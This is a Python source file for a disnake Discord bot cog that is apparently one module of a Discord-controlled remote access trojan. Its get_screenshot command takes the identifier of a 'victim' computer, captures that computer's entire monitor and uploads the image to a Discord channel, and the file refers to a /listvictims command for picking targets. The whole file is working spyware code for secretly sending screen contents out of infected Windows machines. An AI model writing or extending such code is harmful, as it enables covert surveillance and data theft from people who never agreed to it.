import disnake as discord
from disnake.ext import commands
from datetime import datetime
from io import BytesIO

import os, requests, mss
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class GetScreenshot(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def get_screenshot(self, ctx, victim):
        """Sends screenshot of entire monitor

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
           
            with mss.mss() as sct: 
                img = sct.grab(  sct.monitors[1]  )
                
                png = mss.tools.to_png( 
                    img.rgb, 
                    img.size 
                )

            await ctx.followup.send(
                embed=self.bot.genEmbed( 
                    "Screenshot of victim's PC:", 
                    datetime.now() 
                ),
                file = discord.File(
                    BytesIO(png),
                    filename='Screenshot.png'
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(GetScreenshot(bot))